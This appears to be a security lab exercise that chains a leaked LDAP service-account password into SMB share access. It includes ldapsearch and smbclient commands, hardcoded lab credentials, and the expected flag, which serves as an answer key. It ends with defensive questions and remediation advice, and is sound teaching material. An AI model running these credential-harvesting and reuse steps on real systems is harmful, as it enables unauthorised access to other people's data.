# Exercise 2.10: From Directory to Share

## Goal

Use the directory leak from the previous exercise, validate the credential
against an SMB share, and retrieve the evidence token.

## Step 1: Enumerate the service account

```bash
ldapsearch -x -H ldap://<directory-ip> \
  -D 'cn=admin,dc=lab,dc=example,dc=org' \
  -w 'Adm1nPass2026' \
  -b 'dc=lab,dc=example,dc=org' \
  '(uid=svc-backup)' description
```

Expected: the description contains `S3rv1ce!Pass`. Treat this as a lead; validate
it before using it.

## Step 2: List the share

```bash
smbclient -L //<files-ip> -U 'svc-backup%S3rv1ce!Pass'
```

Expected: an `evidence` share.

## Step 3: Retrieve the token

```bash
smbclient //<files-ip>/evidence -U 'svc-backup%S3rv1ce!Pass' \
  -c 'get flag.txt /tmp/flag.txt'
cat /tmp/flag.txt
```

Expected: `OCR{ad_t0_smb_p4th}`.

## Step 4: Write the finding

| Field | Value |
|---|---|
| Directory object | `uid=svc-backup,...` |
| Leaked field | `description` |
| Validated service | SMB `evidence` share |
| Impact | Read access to the evidence share |
| Fix | Managed service account, unique password, rotation, remove the description |

## Analysis

1. Why is credential reuse across a directory and a share a finding?
2. What would least privilege look like for this service account?
3. Which log source would show the SMB authentication?
4. How would Kerberos reduce the exposure of a reused password?

## Defensive takeaway

One leaked service credential can cross service boundaries. Use managed
accounts, unique secrets, rotation, and least privilege, and monitor service
accounts for access outside their normal role.
